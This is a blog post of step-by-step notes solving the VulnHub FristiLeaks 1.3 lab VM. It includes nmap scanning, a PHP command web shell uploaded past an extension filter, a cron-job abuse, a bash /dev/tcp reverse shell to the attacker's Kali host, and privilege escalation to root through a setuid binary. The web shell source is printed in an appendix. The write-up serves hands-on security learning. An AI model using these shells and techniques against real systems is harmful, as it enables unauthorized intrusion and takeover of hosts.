---
author: Nishchal Kush
published: '2016-01-19T19:34:00+10:00'
slug: 2016-01-19-vulnhub-com-fristileaks1-3
tags:
- pentest
- vulnerability
- fristileaks1.3
- penetration testing
- nmap
- vulnhub
- wget
- base64
- fristileaks
- kali
title: vulnhub.com fristileaks1.3
---
host: 192.168.56.1
    dhcp-server: 192.168.56.100
    kali: 192.168.56.101

    * log
      # 2015/12/24 14:45 -> 16:30 (1hr 45min)
      # 2015/12/25 15:00 -> 17:45 (2hr 45min)
      # total time = 4hrs 30min

    * discovery - target
      * nmap --min-parallelism=100 -sP -T5 192.168.56.0/24
      * found target: 192.168.56.102
      
    * discovery - services
      * nmap --min-parallelism=100 -A -T5 -p1-65535 192.168.56.102
      * found ports: 80

    * enumerate port 80
      * wget http://192.168.56.102
      * cat index.html
      * wget http://192.168.56.102/images/keep-calm.png
      * wget http://192.168.56.102/robots.txt
        * robots.txt: disallow /cola /sisi /beer
      * wget http://192.168.56.102/cola/
        * since its not the URL, and we should drink fristi
      * wget http://192.168.56.102/fristi/
        * cat index.html
          * read description meta tag reg comment about base64
          * noticed second commented out base64
          * suspect username: eezeepz
        * extracted commented out line using vi
          * deleted other lines
          * joined all lines (:%j)
          * removed spaces (:%s/\ //g)
          * saved into fristi_img2.txt
      * base64 -d fristi_img2.txt > img2
      * file img2
      * mv img2 img2.png
      * suspect password: keKkeKKeKKeKkEkkEk

    * access
      * http://192.168.56.102/fristi/
      * myusername: eezeepz, mypassword: keKkeKKeKKeKkEkkEk
      * logged into http://192.168.56.102/fristi/login_success.php
      * clicked upload file link to http://192.168.56.102/fristi/upload.php
      * uploaded img2.png and got message regarding /uploads
      * verified upload location http://192.168.56.102/fristi/uploads/img2.png

    * attempted shell access using weevely (failed)
      * generated weevely shell: weevely generate password shell.php
      * cp /usr/share/weevely/shell.php .
      * attempted upload: only allowed png,jpg,gif
      * mv shell.php shell.gif
      * uploaded and connected
      * weevely http://192.168.56.102/fristi/uploads/shell.gif password
      * fixed pythong issues
        * tar zxvf PySocks-1.5.6.tar.gz
        * cd PySocks-1.5.6/
        * ./setup.py build
        * ./setup.py install
      * weevely http://192.168.56.102/fristi/uploads/shell.gif password
      * unable to connect

    * used old script to execute commands
      * renamed to shell.php.jpg
      * uploaded file
      * curl http://192.168.56.102/fristi/uploads/shell.php.jpg?cmd=id
      * uid=48(apache) gid=48(apache) groups=48(apache)
      * curl http://192.168.56.102/fristi/uploads/shell.php.jpg -d cmd="cat /etc/passwd"
      * found: eezeepz, admin, fristigod, fristi
      * ls -l /home/
      * found: drwx---r-x. on eezeepz
      * ls -l /home/eezeepz
      * found: 
        * notes.txt
        * commands (various)
      * cat /home/eezeepz/notes.txt
      * found: 
        * cron runs /tmp/runthis with admin privileges every minute
        * commands chmod, df, cat, echo, ps, grep, egrep in /home/admin
        * access to /usr/bin/*
      * changed access to /home/admin
        * curl http://192s/shell.php.jpg -d cmd="echo '/home/admin/chmod 755 /home/admin/' > /tmp/runthis"
      * ls -las /home/admin/
      * found: cryptedpass.txt, cryptpass.py, and whoisyourgodnow.txt (owner by fristigod)
      * cat /home/admin/whoisyourgodnow.txt
      * found: =RFn0AKnlMHMPIzpyuTI0ITG
      * cat /home/admin/cryptedpass.txt
      * found: mVGZ3O3omkJLmy2pcuTq
      * cat /home/admin/cryptpass.py
      * found:
        * function does base64 then rot13
      * created own script to decrypt password
      * python ./decryptpass.py mVGZ3O3omkJLmy2pcuTq
      * found: thisisalsopw123
      * python ./decryptpass.py =RFn0AKnlMHMPIzpyuTI0ITG
      * found: LetThereBeFristi!
     
    * interactive shell
      * got tired of using the php script and decided to get interactive shell
      * on kali: nc -n -vvv -l -p 80
      * ran via php: /bin/bash -i > /dev/tcp/192.168.56.101/80 0<&1 2>&1, but encoded for url as %2Fbin%2Fbash%20-i%20%3E%20%2Fdev%2Ftcp%2F192.168.56.101%2F80%200%3C%261%202%3E%261
      * now have shell (without TTY, so cannot use su yet)
      * find files owned by users
        * find / -user eezeepz 2>&1 | grep -v "Permission denied"
        * find / -user admin 2>&1 | grep -v "Permission denied"
        * find / -user fristi 2>&1 | grep -v "Permission denied"
        * find / -user fristigod 2>&1 | grep -v "Permission denied"
          * found: /var/fristigod
        * found: empty mailboxes
        * found: /var/www/notes.txt 
          * not very useful since we already figured this out
      * tried to get tty shell 
        // https://pen-testing.sans.org/blog/2014/07/08/sneaky-stealthy-su-in-web-shells
        // http://netsec.ws/?p=337
      * /usr/bin/python -c 'import pty; pty.spawn("/bin/sh")'
      * used: su fristigod and password: LetThereBeFristi!
      * cd /var/fristigod
      * ls -las 
      * found: .bash_history and .secret_admin_stuff
      * cat .bash_history
      * found: sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
      * ls -las /var/fristigod/.secret_admin_stuff/
      * found: suid/guid set on doCom file and owned by root:root
      * file /var/fristigod/.secret_admin_stuff/doCom
      * strings /var/fristigod/.secret_admin_stuff/doCom
      * sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
      * found: Usage: ./program_name terminal_command ...
      * sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id
      * found: uid=0(root) gid=100(users) groups=100(users),502(fristigod)
      * sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom bash
      !! got root !!
      * found: cat /root/fristileaks_secrets.txt
      * cat /root/fristileaks_secrets.txt
      * found: Flag: Y0u_kn0w_y0u_l0ve_fr1st1

    # Other
    * /root/.c has source for doCom
    * cat /root/.mysql_history
      

    * appendix
    // http://snipplr.com/view/72936/simple-php-backdoor-shell/
    -- start of old script -- 
    <?php
    if(isset($_REQUEST['cmd']))
    {
      $cmd = $_REQUEST['cmd'];
      system($cmd);
      echo "<pre>$cmd</pre>";
    }
    else
    {
      echo "<pre>usage: ?cmd=</pre>";
    }
    ?>

    -- end of old script


    // modified cryptpass.py script
    -- start of decryptpass.py script --
    import base64,codecs,sys

    #def encodeString(str):
    #    base64string= base64.b64encode(str)
    #    return codecs.encode(base64string[::-1], 'rot13')

    def decodeString(str):
        rottedString= codecs.encode(str[::-1], 'rot13')
        return base64.b64decode(rottedString)

    #cryptoResult=encodeString(sys.argv[1])
    #print cryptoResult

    #decryptedResult=decodeString(cryptoResult)
    #print decryptedResult

    decryptedResult=decodeString(sys.argv[1])
    print decryptedResult
    -- end of decryptpass.py script --
